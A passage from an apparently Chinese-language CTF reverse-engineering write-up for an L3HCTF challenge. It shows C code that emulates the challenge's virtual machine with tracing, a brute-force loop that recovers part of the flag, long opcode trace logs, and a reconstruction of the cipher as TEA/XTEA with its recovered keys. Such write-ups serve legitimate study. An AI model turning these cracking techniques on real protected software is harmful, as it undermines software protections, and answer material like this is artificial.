pFlag[%d]:%#x + pFlag[%d]:%#x;\\n&quot;, st-&gt;stack - 1, st-&gt;stack, data1, st-&gt;stack - 1, data2); continue; case 1: st-&gt;stack--; data1 = pFlag[st-&gt;stack]; data2 = pFlag[st-&gt;stack - 1]; pFlag[st-&gt;stack - 1] = data1 - data2; printf(&quot;pFlag[%d] = pFlag[%d]:%#x - pFlag[%d]:%#x;\\n&quot;, st-&gt;stack - 1, st-&gt;stack, data1, st-&gt;stack - 1, data2); continue; case 2: st-&gt;stack--; data1 = pFlag[st-&gt;stack]; data2 = pFlag[st-&gt;stack - 1]; pFlag[st-&gt;stack - 1] = data1 * data2; printf(&quot;pFlag[%d] = pFlag[%d]:%#x * pFlag[%d]:%#x;\\n&quot;, st-&gt;stack - 1, st-&gt;stack, data1, st-&gt;stack - 1, data2); continue; case 3: st-&gt;stack--; data1 = pFlag[st-&gt;stack]; data2 = pFlag[st-&gt;stack - 1]; pFlag[st-&gt;stack - 1] = data1 / data2; printf(&quot;pFlag[%d] = pFlag[%d]:%#x / pFlag[%d]:%#x;\\n&quot;, st-&gt;stack - 1, st-&gt;stack, data1, st-&gt;stack - 1, data2); continue; case 4: st-&gt;stack--; data1 = pFlag[st-&gt;stack]; data2 = pFlag[st-&gt;stack - 1]; pFlag[st-&gt;stack - 1] = data1 % data2; printf(&quot;pFlag[%d] = pFlag[%d]:%#x %% pFlag[%d]:%#x;\\n&quot;, st-&gt;stack - 1, st-&gt;stack, data1, st-&gt;stack - 1, data2); continue; case 5: st-&gt;stack--; data1 = pFlag[st-&gt;stack]; data2 = pFlag[st-&gt;stack - 1]; pFlag[st-&gt;stack - 1] = data1 &amp; data2; printf(&quot;pFlag[%d] = pFlag[%d]:%#x &amp; pFlag[%d]:%#x;\\n&quot;, st-&gt;stack - 1, st-&gt;stack, data1, st-&gt;stack - 1, data2); continue; case 6: st-&gt;stack--; data1 = pFlag[st-&gt;stack]; data2 = pFlag[st-&gt;stack - 1]; pFlag[st-&gt;stack - 1] = data1 | data2; printf(&quot;pFlag[%d] = pFlag[%d]:%#x | pFlag[%d]:%#x;\\n&quot;, st-&gt;stack - 1, st-&gt;stack, data1, st-&gt;stack - 1, data2); continue; case 7: st-&gt;stack--; data1 = pFlag[st-&gt;stack]; data2 = pFlag[st-&gt;stack - 1]; pFlag[st-&gt;stack - 1] = data1 ^ data2; printf(&quot;pFlag[%d] = pFlag[%d]:%#x ^ pFlag[%d]:%#x;\\n&quot;, st-&gt;stack - 1, st-&gt;stack, data1, st-&gt;stack - 1, data2); continue; case 8: st-&gt;stack--; tmp = pFlag[st-&gt;stack]; index = pFlag[st-&gt;stack - 1]; pFlag[index] = tmp; printf(&quot;pFlag[%d] = %#x;\\n&quot;, index, tmp); st-&gt;stack--; continue; case 9: index = pFlag[st-&gt;stack - 1]; data1 = pFlag[index]; pFlag[st-&gt;stack - 1] = data1; printf(&quot;pFlag[%d] = %#x;\\n&quot;, st-&gt;stack -1, data1); continue; case 10: tmp = pFlag[st-&gt;stack - 1]; if (tmp == 0) &#123; pFlag[st-&gt;stack - 1] = 1; printf(&quot;pFlag[%d] = 1;\\n&quot;, st-&gt;stack - 1); &#125; else &#123; pFlag[st-&gt;stack - 1] = 0; printf(&quot;pFlag[%d] = 0;\\n&quot;, st-&gt;stack - 1); &#125; continue; case 11: tmp = pFlag[st-&gt;stack - 1]; if ((int)tmp &lt; 0) &#123; pFlag[st-&gt;stack - 1] = 1; printf(&quot;pFlag[%d] = 1;\\n&quot;, st-&gt;stack - 1); &#125; else &#123; pFlag[st-&gt;stack - 1] = 0; printf(&quot;pFlag[%d] = 0;\\n&quot;, st-&gt;stack - 1); &#125; continue; case 12: data1 = pFlag[st-&gt;stack - 1]; data2 = pFlag[st-&gt;stack - 2]; pFlag[st-&gt;stack - 1] = data2; pFlag[st-&gt;stack - 2] = data1; printf(&quot;exchange pFlag[%d]:%#x, pFlag[%d]:%#x\\n&quot;, st-&gt;stack - 1, data2, st-&gt;stack - 2, data1); continue; case 13: st-&gt;stack--; continue; case 14: tmp = *(_DWORD*)&amp;pKey[st-&gt;i]; st-&gt;i += 4; pFlag[st-&gt;stack++] = tmp; printf(&quot;pFlag[%d] = %#x\\n&quot;, st-&gt;stack-1, tmp); continue; case 15: tmp = *(_DWORD*)&amp;pKey[st-&gt;i]; index = st-&gt;i + 4 + tmp; st-&gt;i = index; continue; case 16: tmp = st-&gt;i + 4; st-&gt;stack--; if (pFlag[st-&gt;stack]) tmp += *(_DWORD*)&amp;pKey[st-&gt;i]; st-&gt;i = tmp; continue; case 17: tmp = *(_DWORD*)&amp;pKey[st-&gt;i]; st-&gt;stack += tmp; st-&gt;i += 4; continue; case 18: st-&gt;i += 4; return; default: st-&gt;i++; &#125; &#125;&#125;char flag1[4000] = &#123; 0 &#125;; //前40个字节使用户输入的flag，40往后是为了加密flag用到的数据char flag2[4000] = &#123; 0 &#125;; //前40个字节使用户输入的flag，40往后是为了加密flag用到的数据char compare_date[1000] = &#123; 0xE8, 0xFA, 0xE0, 0xAE, 0x01, 0x41, 0x3E, 0xFC, 0x92, 0xAD, 0x7C, 0x16, 0xBE, 0x6C, 0xEA, 0x51, 0x00, 0x01, 0x2A, 0x24, 0x1B, 0x1A, 0x51, 0x01, 0x94, 0x66, 0x4D, 0x51, 0xEB, 0xBF, 0x5F, 0x2F, 0x98, 0x63, 0xD3, 0x46, 0xF0, 0xE3, 0xEE, 0x79, 0&#125;;int main()&#123; struc_1 v12 = &#123; 0 &#125;; struc_1 v13 = &#123; 0 &#125;; memcpy(flag1, &quot;111111111111222211111111111111111111111\\0&quot;, 40); memcpy(flag2, &quot;111111111111222211111111111111111111111\\0&quot;, 40); v12.pFlag = (_DWORD *)flag1; v12.pKey = key1; v12.i = 0; v12.stack = 0; v13.pFlag = (_DWORD*)flag2; v13.pKey = key2; v13.i = 0; v13.stack = 0; for (int i = 0; i &lt; 0XCA; i+=2) &#123; enc_flag(&amp;v12); memcpy(flag2, flag1, 40); enc_flag(&amp;v13); memcpy(flag1, flag2, 40); printf(&quot;----------------------------------------------------------------------------&quot;); &#125; return 0; &#125; 调试发现，flag是分组进行加密的,每8个字符一组，共5组 第一组 L3HCTF&#123;*, 只差1个字符, 暴力破解 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667char compare_date[] = &#123; 0xE8, 0xFA, 0xE0, 0xAE, 0x01, 0x41, 0x3E, 0xFC, 0x92, 0xAD, 0x7C, 0x16, 0xBE, 0x6C, 0xEA, 0x51, 0x00, 0x01, 0x2A, 0x24, 0x1B, 0x1A, 0x51, 0x01, 0x94, 0x66, 0x4D, 0x51, 0xEB, 0xBF, 0x5F, 0x2F, 0x98, 0x63, 0xD3, 0x46, 0xF0, 0xE3, 0xEE, 0x79&#125;;int main()&#123; struc_1 v12 = &#123; 0 &#125;; struc_1 v13 = &#123; 0 &#125;; memcpy(flag1, &quot;111111111111111111111111111111111111111\\0&quot;, 40); memcpy(flag2, &quot;111111111111111111111111111111111111111\\0&quot;, 40); v12.pFlag = (_DWORD*)flag1; v12.pKey = key1; v12.i = 0; v12.kk = 0; v13.pFlag = (_DWORD*)flag2; v13.pKey = key2; v13.i = 0; v13.kk = 0; memcpy(flag1, &quot;L3HCTF&#123;1&quot;, 8); memcpy(flag2, &quot;L3HCTF&#123;1&quot;, 8); for (int j = 32; j &lt; 127; j++) &#123; v12.pFlag = (_DWORD*)flag1; v12.pKey = key1; v12.i = 0; v12.kk = 0; v13.pFlag = (_DWORD*)flag2; v13.pKey = key2; v13.i = 0; v13.kk = 0; memcpy(flag1, &quot;L3HCTF&#123;&quot;, 8); memcpy(flag2, &quot;L3HCTF&#123;&quot;, 8); flag1[7] = j; flag2[7] = j; for (int i = 0; i &lt; 0XCA; i += 2) &#123; enc_flag(&amp;v12); memcpy(flag2, flag1, 40); enc_flag(&amp;v13); memcpy(flag1, flag2, 40); &#125; if (memcmp(flag1, compare_date, 8) == 0) &#123; printf(&quot;%c\\n&quot;, j); getchar(); &#125; &#125; return 0;&#125;//D 发现第一组是L3HCTF&#123;D 然后下面开始还原VM，只需还原出加密每一组的第一个循环就OK 输入flag 为 L3HCTF&#123;D1111222211111111111111111111111 1234第二组为Input: 31 31 31 31 32 32 32 32enc后Output: ec 9d 57 67 94 6a 7e a5 通过打印的日志，追踪Input，来分析如何得到的Output 加密flag的第二组的第一个循环的日志 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564输入：31 31 31 31 32 32 32 32输出：ec 9d 57 67 94 6a 7e a5======以下是打印的日志OPCODE :14pFlag[21] = 0x14------&gt;OPCODE :14pFlag[22] = 0x14------&gt;OPCODE :9pFlag[22] = 0x13;------&gt;OPCODE :14pFlag[23] = 0x1------&gt;OPCODE :0pFlag[22] = pFlag[23]:0x1 + pFlag[22]:0x13;------&gt;OPCODE :8pFlag[20] = 0x14;------&gt;OPCODE :15------&gt;OPCODE :14pFlag[21] = 0x14------&gt;OPCODE :9pFlag[21] = 0x14;------&gt;OPCODE :14pFlag[22] = 0x14------&gt;OPCODE :12exchange pFlag[22]:0x14, pFlag[21]:0x14------&gt;OPCODE :1pFlag[21] = pFlag[22]:0x14 - pFlag[21]:0x14;------&gt;OPCODE :11pFlag[21] = 0;------&gt;OPCODE :10pFlag[21] = 1;------&gt;OPCODE :16------&gt;OPCODE :14pFlag[21] = 0x13------&gt;OPCODE :14pFlag[22] = 0x13------&gt;OPCODE :9pFlag[22] = 0;------&gt;OPCODE :14pFlag[23] = 0x2------&gt;OPCODE :0pFlag[22] = pFlag[23]:0x2 + pFlag[22]:0;------&gt;OPCODE :8pFlag[19] = 0x2;------&gt;OPCODE :15------&gt;OPCODE :14pFlag[21] = 0x13------&gt;OPCODE :9pFlag[21] = 0x2;------&gt;OPCODE :14pFlag[22] = 0xa------&gt;OPCODE :12exchange pFlag[22]:0x2, pFlag[21]:0xa------&gt;OPCODE :1pFlag[21] = pFlag[22]:0x2 - pFlag[21]:0xa;------&gt;OPCODE :11pFlag[21] = 1;------&gt;OPCODE :10pFlag[21] = 0;------&gt;OPCODE :16------&gt;OPCODE :14pFlag[21] = 0x14------&gt;OPCODE :14pFlag[22] = 0------&gt;OPCODE :8pFlag[20] = 0;------&gt;OPCODE :14pFlag[21] = 0x14------&gt;OPCODE :9pFlag[21] = 0;------&gt;OPCODE :14pFlag[22] = 0x14------&gt;OPCODE :12exchange pFlag[22]:0, pFlag[21]:0x14------&gt;OPCODE :1pFlag[21] = pFlag[22]:0 - pFlag[21]:0x14;------&gt;OPCODE :11pFlag[21] = 1;------&gt;OPCODE :10pFlag[21] = 0;------&gt;OPCODE :16------&gt;OPCODE :14pFlag[21] = 0xc------&gt;OPCODE :14pFlag[22] = 0x13------&gt;OPCODE :9pFlag[22] = 0x2;------&gt;OPCODE :14pFlag[23] = 0------&gt;OPCODE :0pFlag[22] = pFlag[23]:0 + pFlag[22]:0x2;------&gt;OPCODE :9pFlag[22] = 0x31313131;------&gt;OPCODE :8pFlag[12] = 0x31313131;------&gt;OPCODE :14pFlag[21] = 0xd------&gt;OPCODE :14pFlag[22] = 0x13------&gt;OPCODE :9pFlag[22] = 0x2;------&gt;OPCODE :14pFlag[23] = 0x1------&gt;OPCODE :0pFlag[22] = pFlag[23]:0x1 + pFlag[22]:0x2;------&gt;OPCODE :14pFlag[23] = 0------&gt;OPCODE :0pFlag[22] = pFlag[23]:0 + pFlag[22]:0x3;------&gt;OPCODE :9pFlag[22] = 0x32323232;------&gt;OPCODE :8pFlag[13] = 0x32323232;------&gt;OPCODE :14pFlag[21] = 0xc------&gt;OPCODE :14pFlag[22] = 0xc------&gt;OPCODE :9pFlag[22] = 0x31313131;------&gt;OPCODE :14pFlag[23] = 0xd------&gt;OPCODE :9pFlag[23] = 0x32323232;------&gt;OPCODE :14pFlag[24] = 0x10------&gt;OPCODE :2pFlag[23] = pFlag[24]:0x10 * pFlag[23]:0x32323232; ====------&gt;OPCODE :14pFlag[24] = 0xd------&gt;OPCODE :9pFlag[24] = 0x32323232;------&gt;OPCODE :14pFlag[25] = 0x20------&gt;OPCODE :12exchange pFlag[25]:0x32323232, pFlag[24]:0x20------&gt;OPCODE :3pFlag[24] = pFlag[25]:0x32323232 / pFlag[24]:0x20; ====------&gt;OPCODE :7pFlag[23] = pFlag[24]:0x1919191 ^ pFlag[23]:0x23232320;------&gt;OPCODE :14pFlag[24] = 0xd------&gt;OPCODE :9pFlag[24] = 0x32323232; ====------&gt;OPCODE :0pFlag[23] = pFlag[24]:0x32323232 + pFlag[23]:0x22b2b2b1; ====------&gt;OPCODE :14pFlag[24] = 0xb------&gt;OPCODE :9pFlag[24] = 0xce0a6e55;------&gt;OPCODE :14pFlag[25] = 0xb------&gt;OPCODE :9pFlag[25] = 0xce0a6e55;------&gt;OPCODE :14pFlag[26] = 0x3------&gt;OPCODE :5pFlag[25] = pFlag[26]:0x3 &amp; pFlag[25]:0xce0a6e55;------&gt;OPCODE :14pFlag[26] = 0xe------&gt;OPCODE :0pFlag[25] = pFlag[26]:0xe + pFlag[25]:0x1;------&gt;OPCODE :9pFlag[25] = 0x6f76;------&gt;OPCODE :0pFlag[24] = pFlag[25]:0x6f76 + pFlag[24]:0xce0a6e55;------&gt;OPCODE :7pFlag[23] = pFlag[24]:0xce0addcb ^ pFlag[23]:0x54e4e4e3;------&gt;OPCODE :0pFlag[22] = pFlag[23]:0x9aee3928 + pFlag[22]:0x31313131; ===------&gt;OPCODE :8pFlag[12] = 0xcc1f6a59;------&gt;OPCODE :14pFlag[21] = 0xb------&gt;OPCODE :14pFlag[22] = 0xb------&gt;OPCODE :9pFlag[22] = 0xce0a6e55; === 上一轮循环剩下的------&gt;OPCODE :14pFlag[23] = 0xa------&gt;OPCODE :9pFlag[23] = 0x75bcd15;------&gt;OPCODE :0pFlag[22] = pFlag[23]:0x75bcd15 + pFlag[22]:0xce0a6e55;------&gt;OPCODE :8pFlag[11] = 0xd5663b6a;====------&gt;OPCODE :14pFlag[21] = 0xd------&gt;OPCODE :14pFlag[22] = 0xd------&gt;OPCODE :9pFlag[22] = 0x32323232;------&gt;OPCODE :14pFlag[23] = 0xc------&gt;OPCODE :9pFlag[23] = 0xcc1f6a59;------&gt;OPCODE :14pFlag[24] = 0x10------&gt;OPCODE :2pFlag[23] = pFlag[24]:0x10 * pFlag[23]:0xcc1f6a59; ===------&gt;OPCODE :14pFlag[24] = 0xc------&gt;OPCODE :9pFlag[24] = 0xcc1f6a59;------&gt;OPCODE :14pFlag[25] = 0x20------&gt;OPCODE :12exchange pFlag[25]:0xcc1f6a59, pFlag[24]:0x20------&gt;OPCODE :3pFlag[24] = pFlag[25]:0xcc1f6a59 / pFlag[24]:0x20;------&gt;OPCODE :7pFlag[23] = pFlag[24]:0xfe60fb53 ^ pFlag[23]:0xc1f6a590;------&gt;OPCODE :14pFlag[24] = 0xc------&gt;OPCODE :9pFlag[24] = 0xcc1f6a59;------&gt;OPCODE :0pFlag[23] = pFlag[24]:0xcc1f6a59 + pFlag[23]:0x3f965ec3;------&gt;OPCODE :14pFlag[24] = 0xb------&gt;OPCODE :9pFlag[24] = 0xd5663b6a;------&gt;OPCODE :14pFlag[25] = 0xb------&gt;OPCODE :9pFlag[25] = 0xd5663b6a;------&gt;OPCODE :14pFlag[26] = 0x800------&gt;OPCODE :12exchange pFlag[26]:0xd5663b6a, pFlag[25]:0x800------&gt;OPCODE :3pFlag[25] = pFlag[26]:0xd5663b6a / pFlag[25]:0x800;------&gt;OPCODE :14pFlag[26] = 0x3------&gt;OPCODE :5pFlag[25] = pFlag[26]:0x3 &amp; pFlag[25]:0xfffaacc8; ====------&gt;OPCODE :14pFlag[26] = 0xe------&gt;OPCODE :0pFlag[25] = pFlag[26]:0xe + pFlag[25]:0;------&gt;OPCODE :9pFlag[25] = 0x494c;------&gt;OPCODE :0pFlag[24] = pFlag[25]:0x494c + pFlag[24]:0xd5663b6a;===------&gt;OPCODE :7pFlag[23] = pFlag[24]:0xd56684b6 ^ pFlag[23]:0xbb5c91c; ===------&gt;OPCODE :0pFlag[22] = pFlag[23]:0xded34daa + pFlag[22]:0x32323232;------&gt;OPCODE :8pFlag[13] = 0x11057fdc; === ------&gt;OPCODE :14pFlag[21] = 0x13------&gt;OPCODE :9pFlag[21] = 0x2;------&gt;OPCODE :14pFlag[22] = 0------&gt;OPCODE :0pFlag[21] = pFlag[22]:0 + pFlag[21]:0x2;------&gt;OPCODE :14pFlag[22] = 0xc------&gt;OPCODE :9pFlag[22] = 0xcc1f6a59;------&gt;OPCODE :8pFlag[2] = 0xcc1f6a59;------&gt;OPCODE :14pFlag[21] = 0x13------&gt;OPCODE :9pFlag[21] = 0x2;------&gt;OPCODE :14pFlag[22] = 0x1------&gt;OPCODE :0pFlag[21] = pFlag[22]:0x1 + pFlag[21]:0x2;------&gt;OPCODE :14pFlag[22] = 0------&gt;OPCODE :0pFlag[21] = pFlag[22]:0 + pFlag[21]:0x3;------&gt;OPCODE :14pFlag[22] = 0xd------&gt;OPCODE :9pFlag[22] = 0x11057fdc;------&gt;OPCODE :8pFlag[3] = 0x11057fdc;------&gt;OPCODE :18 =============================================v13准备开始------&gt;OPCODE :14pFlag[21] = 0x14------&gt;OPCODE :14pFlag[22] = 0x14------&gt;OPCODE :9pFlag[22] = 0x13;------&gt;OPCODE :14pFlag[23] = 0x1------&gt;OPCODE :0pFlag[22] = pFlag[23]:0x1 + pFlag[22]:0x13;------&gt;OPCODE :8pFlag[20] = 0x14;------&gt;OPCODE :15------&gt;OPCODE :14pFlag[21] = 0x14------&gt;OPCODE :9pFlag[21] = 0x14;------&gt;OPCODE :14pFlag[22] = 0x14------&gt;OPCODE :12exchange pFlag[22]:0x14, pFlag[21]:0x14------&gt;OPCODE :1pFlag[21] = pFlag[22]:0x14 - pFlag[21]:0x14;------&gt;OPCODE :11pFlag[21] = 0;------&gt;OPCODE :10pFlag[21] = 1;------&gt;OPCODE :16------&gt;OPCODE :14pFlag[21] = 0x13------&gt;OPCODE :14pFlag[22] = 0x13------&gt;OPCODE :9pFlag[22] = 0;------&gt;OPCODE :14pFlag[23] = 0x2------&gt;OPCODE :0pFlag[22] = pFlag[23]:0x2 + pFlag[22]:0;------&gt;OPCODE :8pFlag[19] = 0x2;------&gt;OPCODE :15------&gt;OPCODE :14pFlag[21] = 0x13------&gt;OPCODE :9pFlag[21] = 0x2;------&gt;OPCODE :14pFlag[22] = 0xa------&gt;OPCODE :12exchange pFlag[22]:0x2, pFlag[21]:0xa------&gt;OPCODE :1pFlag[21] = pFlag[22]:0x2 - pFlag[21]:0xa;------&gt;OPCODE :11pFlag[21] = 1;------&gt;OPCODE :10pFlag[21] = 0;------&gt;OPCODE :16------&gt;OPCODE :14pFlag[21] = 0x14------&gt;OPCODE :14pFlag[22] = 0------&gt;OPCODE :8pFlag[20] = 0;------&gt;OPCODE :14pFlag[21] = 0x14------&gt;OPCODE :9pFlag[21] = 0;------&gt;OPCODE :14pFlag[22] = 0x14------&gt;OPCODE :12exchange pFlag[22]:0, pFlag[21]:0x14------&gt;OPCODE :1pFlag[21] = pFlag[22]:0 - pFlag[21]:0x14;------&gt;OPCODE :11pFlag[21] = 1;------&gt;OPCODE :10pFlag[21] = 0;------&gt;OPCODE :16------&gt;OPCODE :14pFlag[21] = 0xc------&gt;OPCODE :14pFlag[22] = 0x13------&gt;OPCODE :9pFlag[22] = 0x2;------&gt;OPCODE :14pFlag[23] = 0------&gt;OPCODE :0pFlag[22] = pFlag[23]:0 + pFlag[22]:0x2;------&gt;OPCODE :9pFlag[22] = 0xcc1f6a59;------&gt;OPCODE :8pFlag[12] = 0xcc1f6a59;------&gt;OPCODE :14pFlag[21] = 0xd------&gt;OPCODE :14pFlag[22] = 0x13------&gt;OPCODE :9pFlag[22] = 0x2;------&gt;OPCODE :14pFlag[23] = 0x1------&gt;OPCODE :0pFlag[22] = pFlag[23]:0x1 + pFlag[22]:0x2;------&gt;OPCODE :14pFlag[23] = 0------&gt;OPCODE :0pFlag[22] = pFlag[23]:0 + pFlag[22]:0x3;------&gt;OPCODE :9pFlag[22] = 0x11057fdc;------&gt;OPCODE :8pFlag[13] = 0x11057fdc;------&gt;OPCODE :14pFlag[21] = 0xb------&gt;OPCODE :14pFlag[22] = 0xb------&gt;OPCODE :9pFlag[22] = 0x798dcdf9;------&gt;OPCODE :14pFlag[23] = 0xa------&gt;OPCODE :9pFlag[23] = 0x154cbf7; = =====系统中的立即数------&gt;OPCODE :0pFlag[22] = pFlag[23]:0x154cbf7 + pFlag[22]:0x798dcdf9; == 这2个数是固定的------&gt;OPCODE :8pFlag[11] = 0x7ae299f0; =========------&gt;OPCODE :14pFlag[21] = 0xc------&gt;OPCODE :14pFlag[22] = 0xc------&gt;OPCODE :9pFlag[22] = 0xcc1f6a59;------&gt;OPCODE :14pFlag[23] = 0xd------&gt;OPCODE :9pFlag[23] = 0x11057fdc;------&gt;OPCODE :14pFlag[24] = 0x10------&gt;OPCODE :2pFlag[23] = pFlag[24]:0x10 * pFlag[23]:0x11057fdc;========------&gt;OPCODE :14pFlag[24] = 0------&gt;OPCODE :14pFlag[25] = 0xe------&gt;OPCODE :0pFlag[24] = pFlag[25]:0xe + pFlag[24]:0;------&gt;OPCODE :9pFlag[24] = 0x5354;------&gt;OPCODE :0pFlag[23] = pFlag[24]:0x5354 + pFlag[23]:0x1057fdc0; =======------&gt;OPCODE :14pFlag[24] = 0xd------&gt;OPCODE :9pFlag[24] = 0x11057fdc;------&gt;OPCODE :14pFlag[25] = 0xb------&gt;OPCODE :9pFlag[25] = 0x7ae299f0;------&gt;OPCODE :0pFlag[24] = pFlag[25]:0x7ae299f0 + pFlag[24]:0x11057fdc;------&gt;OPCODE :14pFlag[25] = 0xd------&gt;OPCODE :9pFlag[25] = 0x11057fdc;------&gt;OPCODE :14pFlag[26] = 0x20------&gt;OPCODE :12exchange pFlag[26]:0x11057fdc, pFlag[25]:0x20------&gt;OPCODE :3pFlag[25] = pFlag[26]:0x11057fdc / pFlag[25]:0x20; ### 0x882bfe------&gt;OPCODE :14pFlag[26] = 0x1------&gt;OPCODE :14pFlag[27] = 0xe------&gt;OPCODE :0pFlag[26] = pFlag[27]:0xe + pFlag[26]:0x1;------&gt;OPCODE :9pFlag[26] = 0x4f4d;------&gt;OPCODE :0pFlag[25] = pFlag[26]:0x4f4d + pFlag[25]:0x882bfe;------&gt;OPCODE :7pFlag[24] = pFlag[25]:0x887b4b ^ pFlag[24]:0x8be819cc; =====------&gt;OPCODE :7pFlag[23] = pFlag[24]:0x8b606287 ^ pFlag[23]:0x10585114;==------&gt;OPCODE :0pFlag[22] = pFlag[23]:0x9b383393 + pFlag[22]:0xcc1f6a59;=====------&gt;OPCODE :8pFlag[12] = 0x67579dec; ######------&gt;OPCODE :14pFlag[21] = 0xd------&gt;OPCODE :14pFlag[22] = 0xd------&gt;OPCODE :9pFlag[22] = 0x11057fdc;------&gt;OPCODE :14pFlag[23] = 0xc------&gt;OPCODE :9pFlag[23] = 0x67579dec;------&gt;OPCODE :14pFlag[24] = 0x10------&gt;OPCODE :2pFlag[23] = pFlag[24]:0x10 * pFlag[23]:0x67579dec;------&gt;OPCODE :14pFlag[24] = 0x2------&gt;OPCODE :14pFlag[25] = 0xe------&gt;OPCODE :0pFlag[24] = pFlag[25]:0xe + pFlag[24]:0x2;------&gt;OPCODE :9pFlag[24] = 0x2074;------&gt;OPCODE :0pFlag[23] = pFlag[24]:0x2074 + pFlag[23]:0x7579dec0; === 49------&gt;OPCODE :14pFlag[24] = 0xc------&gt;OPCODE :9pFlag[24] = 0x67579dec;------&gt;OPCODE :14pFlag[25] = 0xb------&gt;OPCODE :9pFlag[25] = 0x7ae299f0;------&gt;OPCODE :0pFlag[24] = pFlag[25]:0x7ae299f0 + pFlag[24]:0x67579dec; =====------&gt;OPCODE :14pFlag[25] = 0xc------&gt;OPCODE :9pFlag[25] = 0x67579dec;------&gt;OPCODE :14pFlag[26] = 0x20------&gt;OPCODE :12exchange pFlag[26]:0x67579dec, pFlag[25]:0x20------&gt;OPCODE :3pFlag[25] = pFlag[26]:0x67579dec / pFlag[25]:0x20;===&#x27;0x33abcef&#x27;------&gt;OPCODE :14pFlag[26] = 0x3------&gt;OPCODE :14pFlag[27] = 0xe------&gt;OPCODE :0pFlag[26] = pFlag[27]:0xe + pFlag[26]:0x3;------&gt;OPCODE :9pFlag[26] = 0x6561;------&gt;OPCODE :0pFlag[25] = pFlag[26]:0x6561 + pFlag[25]:0x33abcef;------&gt;OPCODE :7pFlag[24] = pFlag[25]:0x33b2250 ^ pFlag[24]:0xe23a37dc;------&gt;OPCODE :7pFlag[23] = pFlag[24]:0xe101158c ^ pFlag[23]:0x7579ff34;------&gt;OPCODE :0pFlag[22] = pFlag[23]:0x9478eab8 + pFlag[22]:0x11057fdc; # &#x27;0xa57e6a94&#x27;------&gt;OPCODE :8pFlag[13] = 0xa57e6a94;------&gt;OPCODE :14pFlag[21] = 0x13------&gt;OPCODE :9pFlag[21] = 0x2;------&gt;OPCODE :14pFlag[22] = 0------&gt;OPCODE :0pFlag[21] = pFlag[22]:0 + pFlag[21]:0x2;------&gt;OPCODE :14pFlag[22] = 0xc------&gt;OPCODE :9pFlag[22] = 0x67579dec;------&gt;OPCODE :8pFlag[2] = 0x67579dec;------&gt;OPCODE :14pFlag[21] = 0x13------&gt;OPCODE :9pFlag[21] = 0x2;------&gt;OPCODE :14pFlag[22] = 0x1------&gt;OPCODE :0pFlag[21] = pFlag[22]:0x1 + pFlag[21]:0x2;------&gt;OPCODE :14pFlag[22] = 0------&gt;OPCODE :0pFlag[21] = pFlag[22]:0 + pFlag[21]:0x3;------&gt;OPCODE :14pFlag[22] = 0xd------&gt;OPCODE :9pFlag[22] = 0xa57e6a94;------&gt;OPCODE :8pFlag[3] = 0xa57e6a94;------&gt;OPCODE :18---------------------------------------------------------------------------- 分析算法 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758A = FLAG[0:4]B = FLAG[4:8]pFlag[23] = B * 0x10pFlag[24] = B / 0X20 pFlag[23] = pFlag[23] ^ pFlag[24]pFlag[23] = B + pFlag[23] pFlag[23] = (0xCE0A6E55 + 0X6F76) ^ pFlag[23] pFlag[22] = pFlag[23] + A TMP1 = pFlag[22] # 173行 0xcc1f6a59 ***V12导出 # v0pFlag[22] = 0xCE0A6E55 # (过会回来补坑，这个是上一轮循环剩下的) 这个与FLAG无关，是固定的pFlag[22] = 0x75bcd15(立即数) + 0xce0a6e55TMP2 = pFlag[22] # 187行 0xd5663b6a #TMP2 = sum1pFlag[23] = TMP1pFlag[23] = TMP1 * 0X10 # 201pFlag[24] = TMP1 / 0x20 # 213pFlag[23] = pFlag[23] ^ pFlag[24]pFlag[23] = TMP1 + pFlag[23] pFlag[26] = TMP2pFlag[25] = pFlag[26] / 0x800 #233行pFlag[24] = TMP2 + 0x494c ###245pFlag[23] = pFlag[24] ^ pFlag[23]pFlag[22] = pFlag[23] + B TMP3 = pFlag[22] ### 251行 0x11057fdc ***V12导出 #v1pFlag[22] = 0x154cbf7(立即数) + 0x798dcdf9; #这2个数是固定的 #在第一轮的时候是这个，其他的还没测试TMP4 = pFlag[22] ###407行 0x7ae299f0pFlag[23] = TMP3 * 0X10pFlag[23] = pFlag[23] + 0X5354 # 421 pFlag[24] = TMP4 + TMP3 #441 pFlag[25] = TMP3 / 0x20 #451 ### 0x882bfepFlag[25] = 0x4f4d + pFlag[25] pFlag[24] = pFlag[25] ^ pFlag[24]pFlag[23] = pFlag[24] ^ pFlag[23] #465 ## 0x9b383393pFlag[22] = pFlag[23] + TMP1TMP5 = pFlag[22] #### 469 0x67579decpFlag[23] = TMP5 * 0X10pFlag[23] = pFlag[23] + 0x2074 ## 0x7579ff34pFlag[24] = TMP4 + TMP5 ####503行pFlag[25] = TMP5 / 0x20pFlag[25] = pFlag[25] + 0x6561pFlag[24] = pFlag[25] ^ pFlag[24]pFlag[23] = pFlag[24] ^ pFlag[23]pFlag[22] = pFlag[23] + TMP3 # 529行 0xa57e6a94TMP6 = pFlag[22] # 0xa57e6a94 通过 * 0x10 、/0x20、 /0x800、 &amp;3等特征，猜测是xtea， tea算法 一边猜一边还原算法,用C语言写出1轮的循环加密算法 1234567891011121314151617181920int tea_key[4] = &#123; 0X5354, 0x4f4d, 0x2074, 0x6561 &#125;;int xtea_key[4] = &#123; 0x494c, 0X6F76 , 0x6520, 0x4355 &#125;;void encrypt(int* v, int&amp; sum_xtea, int&amp; sum_tea)&#123; int v0 = v[0], v1 = v[1]; v0 += (((v1 &lt;&lt; 4) ^ (v1 / 0x20)) + v1) ^ (sum_xtea + xtea_key[sum_xtea 